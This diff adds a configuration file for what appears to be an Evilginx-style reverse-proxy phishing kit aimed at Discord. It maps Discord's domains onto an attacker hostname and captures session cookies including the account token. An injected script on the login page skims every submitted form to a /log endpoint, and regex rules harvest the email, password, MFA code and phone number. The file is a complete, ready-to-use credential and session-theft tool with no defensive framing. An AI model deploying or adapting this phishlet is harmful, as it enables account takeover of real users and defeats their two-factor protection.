@@ -1,0 +1,156 @@
+name: 'Discord'
+author: 'HTB (Modified by LxKh4n1yn-Kali-linuX)'
+min_ver: '3.2.0'
+
+proxy_hosts:
+  - { phish_sub: 'www', orig_sub: '', domain: 'discord.com', session: true, is_landing: true }
+  - { phish_sub: 'cdn', orig_sub: 'cdn', domain: 'discordapp.com', session: false, is_landing: false }
+  - { phish_sub: 'media', orig_sub: 'media', domain: 'discordapp.net', session: false, is_landing: false }
+  - { phish_sub: 'images', orig_sub: 'images', domain: 'discordapp.net', session: false, is_landing: false }
+  - { phish_sub: 'gateway', orig_sub: 'gateway', domain: 'discord.gg', session: false, is_landing: false }
+  - { phish_sub: 'status', orig_sub: 'status', domain: 'discord.com', session: false, is_landing: false }
+  - { phish_sub: 'discord', orig_sub: '', domain: 'discord.gg', session: false, is_landing: false }
+
+sub_filters:
+  - triggers_on: 'discord.com'
+    hostname: '{hostname}'
+    sub: 'www'
+    orig_sub: ''
+    domain: 'discord.com'
+    search: 'discord.com'
+    replace: '{hostname}'
+    mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'image/x-icon', 'text/plain', 'application/xml', 'image/*', 'font/*']
+  - triggers_on: 'discord.com'
+    hostname: '{hostname}'
+    sub: 'www'
+    orig_sub: ''
+    domain: 'discord.com'
+    search: '"discord.com"'
+    replace: '"{hostname}"'
+    mimes: ['text/html', 'application/javascript', 'text/css', 'application/json']
+  - triggers_on: 'discord.com'
+    hostname: '{hostname}'
+    sub: 'www'
+    orig_sub: ''
+    domain: 'discord.com'
+    search: 'discord.com'
+    replace: '{hostname}'
+    mimes: ['application/x-www-form-urlencoded']
+  - triggers_on: 'cdn.discordapp.com'
+    hostname: '{hostname}'
+    sub: 'cdn'
+    orig_sub: 'cdn'
+    domain: 'discordapp.com'
+    search: 'cdn.discordapp.com'
+    replace: 'cdn.{hostname}'
+    mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'image/*']
+  - triggers_on: 'media.discordapp.net'
+    hostname: '{hostname}'
+    sub: 'media'
+    orig_sub: 'media'
+    domain: 'discordapp.net'
+    search: 'media.discordapp.net'
+    replace: 'media.{hostname}'
+    mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'image/*']
+  - triggers_on: 'images.discordapp.net'
+    hostname: '{hostname}'
+    sub: 'images'
+    orig_sub: 'images'
+    domain: 'discordapp.net'
+    search: 'images.discordapp.net'
+    replace: 'images.{hostname}'
+    mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'image/*']
+  - triggers_on: 'gateway.discord.gg'
+    hostname: '{hostname}'
+    sub: 'gateway'
+    orig_sub: 'gateway'
+    domain: 'discord.gg'
+    search: 'gateway.discord.gg'
+    replace: 'gateway.{hostname}'
+    mimes: ['text/html', 'application/javascript', 'text/css', 'application/json']
+  - triggers_on: 'discord.gg'
+    hostname: '{hostname}'
+    sub: 'discord'
+    orig_sub: ''
+    domain: 'discord.gg'
+    search: 'discord.gg'
+    replace: 'discord.{hostname}'
+    mimes: ['text/html', 'application/javascript', 'text/css', 'application/json']
+
+auth_tokens:
+  - domain: 'discord.com'
+    keys: ['token', '__dcfduid', '__sdcfduid', '__stripe_mid', '__cfruid', 'locale', 'sessionid']
+  - domain: '.discord.com'
+    keys: ['token', '__dcfduid', '__sdcfduid', '__stripe_mid', '__cfruid', 'locale']
+
+js_inject:
+  - trigger_domains: ["discord.com"]
+    trigger_paths: ["/login"]
+    script: |
+      setTimeout(function() {
+        var forms = document.getElementsByTagName('form');
+        for (var i = 0; i < forms.length; i++) {
+          forms[i].addEventListener('submit', function() {
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', '/log', true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            var formData = new FormData(this);
+            var data = {};
+            for (var pair of formData.entries()) {
+              data[pair[0]] = pair[1];
+            }
+            xhr.send(JSON.stringify(data));
+          });
+        }
+      }, 2000);
+
+credentials:
+  username:
+    key: 'email'
+    search: '"email":"([^"]+)"'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '"password":"([^"]+)"'
+    type: 'post'
+  mfa:
+    key: 'mfa'
+    search: '"code":"([^"]+)"'
+    type: 'post'
+  phone:
+    key: 'phone'
+    search: '"phone":"([^"]+)"'
+    type: 'post'
+
+auth_urls:
+  - ^https://www\.{hostname}/api/v9/auth/login$
+  - ^https://www\.{hostname}/api/v9/auth/mfa/totp$
+  - ^https://www\.{hostname}/api/v9/auth/mfa/sms$
+  - ^https://www\.{hostname}/login$
+  - ^https://www\.{hostname}/app$
+
+login:
+  domain: 'discord.com'
+  username: 'email'
+  password: 'password'
+  path: '/login'
+
+force_post:
+  - path: '/api/v9/auth/login'
+    type: 'post'
+    search:
+      - {key: 'email', search: '"email":"([^"]+)"'}
+      - {key: 'password', search: '"password":"([^"]+)"'}
+    force:
+      - {key: 'login', value: '{email}'}
+      - {key: 'password', value: '{password}'}
+      - {key: 'undelete', value: 'false'}
+      - {key: 'captcha_key', value: 'null'}
+      - {key: 'login_source', value: 'null'}
+      - {key: 'gift_code_sku_id', value: 'null'}
+      - {key: 'login_source', value: 'null'}
+      - {key: 'gift_code_sku_id', value: 'null'}
+
+# Upgraded and modified by LxKh4n1yn-Kali-linuX
+# Modified by LxKhaninScientist
+# Made by lxkhanin
